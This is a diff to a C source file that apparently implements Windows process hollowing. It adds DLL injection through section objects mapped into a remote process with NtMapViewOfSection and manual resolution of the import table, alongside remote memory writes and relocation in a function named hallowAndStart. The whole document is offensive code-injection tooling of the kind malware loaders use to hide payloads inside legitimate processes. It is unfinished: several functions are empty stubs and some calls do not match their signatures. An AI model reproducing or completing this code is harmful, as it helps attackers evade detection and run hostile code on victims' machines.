@@ -111,6 +111,7 @@ MappingMetadata PEParser(BYTE* pe){
 
 
 void mapRoutineX(HANDLE proc,BYTE* remoteV,MappingMetadata mm,IMAGE_SECTION_HEADER **reloc){
+    // abstract mapping routine X
     IMAGE_SECTION_HEADER* sec=(IMAGE_SECTION_HEADER*)mm.ImageSectionHeaders;
     unsigned long _sz=sizeof(IMAGE_SECTION_HEADER); // 40 bytes in x64 PE
 
@@ -241,13 +242,19 @@ void rellocate(HANDLE proc,void* remoteImageBase,void* heapBase,void* preferedBa
     printf("relocated successfuly!\n");
 }
 
+bool syncLoadedDlls(char* dll, char** dllList){
 
+    
+}
 
 // vergiliusproject.com 
-bool injectDLL(HANDLE proc,char* dll){
-    // open dll file
-    // create section object backed by that file (SEC_IMAGE)
-    // map section to target process
+bool injectDLL(HANDLE proc,char* dll,T_NtMapViewOfSection NtMapViewOfSection,char** loadedDlls){
+    // for dll injection i had 2 options.
+    // 1. open file normally and parse it and write to allocated mem in process.
+    // 2. create section object backed by PE file.
+    // prefered second. because windows memory manager applies rellocation
+    // in that case. but i have to fill IAT still + load dll s recurisively if necess.
+
     char* searchDirectory="C:\\Windows\\System32\\";
     char* dll_file=calloc(strlen(searchDirectory)+strlen(dll)+1,sizeof(char));
     strcpy(dll_file,searchDirectory);
@@ -256,17 +263,17 @@ bool injectDLL(HANDLE proc,char* dll){
         dll_file,
         GENERIC_READ,
         0,
-        0,
         NULL,
         OPEN_ALWAYS,
         FILE_ATTRIBUTE_NORMAL,
-        NULL,
-
+        NULL
     );
+
     if(hDll==INVALID_HANDLE_VALUE){
         printf("[-] REQUIRED DLL IS NOT PRESENT ON THE SYSTEM!\n");
         exit(1);
     }
+
     HANDLE sectionObjectHandle=CreateFileMappingA(
         hDll,
         NULL,
@@ -275,14 +282,43 @@ bool injectDLL(HANDLE proc,char* dll){
         0,
         NULL
     );
+    printf("section object for dll file: %s is created\n",dll_file);
     
+    SIZE_T viewSz=0;
+    void *dllBase=NULL;
+    NTSTATUS mappedSection=NtMapViewOfSection(
+        sectionObjectHandle,
+        proc,
+        dllBase,
+        0,
+        0,
+        NULL,
+        &viewSz,
+        ViewUnmap,
+        0,
+        PAGE_READONLY
 
-    // resolve IAT ))
+    );
+
+    if(mappedSection!=STATUS_SUCCESS){
+        printf("[-] FAILED TO MAP SECTION OBJECT IN VA SPACE. 299\n");
+        exit(1);
+    }
+    printf("section object of type SEC_IMAGE for DLL file has been mapped to va space of process.check debugger\n");
+    getchar();
+    syncLoadedDlls(dll,loadedDlls);
+    resolveIAT(proc,dllBase,NtMapViewOfSection);
+    
+    // return essential info for filling IAT for those image depending on this dll
+
+    return true;
+ 
 }   
 
 
 bool isDllLoaded(char* dll,char** loaded_list,int loaded_count){
 
+    return false;
 
 }
 
@@ -292,7 +328,7 @@ void* extractDllExportTable(){
 }
 
 // should work for both main PE and loaded DLLs
-void resolveIAT(HANDLE proc,BYTE* imageBase){
+void resolveIAT(HANDLE proc,BYTE* imageBase,T_NtMapViewOfSection NtMapViewOfSection,char* loadedDlls){
     unsigned long long e_lfanew=(unsigned long long)(imageBase+0x3c);
     long e_lfanew_val=0;
     ReadProcessMemory(
@@ -339,7 +375,6 @@ void resolveIAT(HANDLE proc,BYTE* imageBase){
     unsigned int import_dd_count=import_dd_sz/20;
     
     while(true){
-
         unsigned long rva_import_name_table=0;
         unsigned long rva_iat=0;
         unsigned long rva_name=0;
@@ -374,7 +409,7 @@ void resolveIAT(HANDLE proc,BYTE* imageBase){
 
         char c='x';
         int read=0;
-        char __dll__name[50];
+        char *__dll__name=calloc(30,1);
         while(read<49){
         ReadProcessMemory(
             proc,
@@ -383,7 +418,7 @@ void resolveIAT(HANDLE proc,BYTE* imageBase){
             sizeof(char),
             NULL
         );
-        __dll__name[read]=c;
+        strcpy((char*)(__dll__name+read),&c);
         if(c==0)
             break;
         read++;
@@ -392,11 +427,14 @@ void resolveIAT(HANDLE proc,BYTE* imageBase){
 
         if(isDllLoaded(__dll__name))
         {
-            
+            unsigned long long table=extractDllExportTable();
+            // apply IAT resolving
         }
         else
         {
-            unsigned long long base=injectDLL(proc,__dll__name);
+            unsigned long long base=injectDLL(proc,__dll__name,NtMapViewOfSection);
+            // apply IAT resolving 
+
         }
 
         import_descriptor+=20;
@@ -407,9 +445,6 @@ void resolveIAT(HANDLE proc,BYTE* imageBase){
 
 
 bool hallowAndStart(HANDLE proc,HANDLE thread,BYTE* pe){
-char* loaded_dlls=calloc(1,strlen("ntdll.dll"));
-strcpy(loaded_dlls,"ntdll.dll");
-
 HANDLE self=GetCurrentProcess();
 HMODULE ntdll=GetModuleHandleA("ntdll");
 T_NtQueryInformationProcess NtQueryInformationProcess=(T_NtQueryInformationProcess)GetProcAddress(ntdll,"NtQueryInformationProcess");
@@ -534,8 +569,13 @@ if(!WriteProcessMemory(
 }
 
 
+char* native="ntdll.dll";
+char* fDll=calloc(1,strlen(native)+1);
+strcpy(fDll,native);
+char** loadedDlls=malloc(sizeof(unsigned long long));
+memcpy(loadedDlls,fDll,sizeof(unsigned long long));
 
-resolveIAT(proc,remoteV);
+resolveIAT(proc,remoteV,NtMapViewOfSection,loadedDlls);
 
 uintptr_t entryPont=(uintptr_t)(remoteV+mm.RVAAddressOfEntryPoint);
 
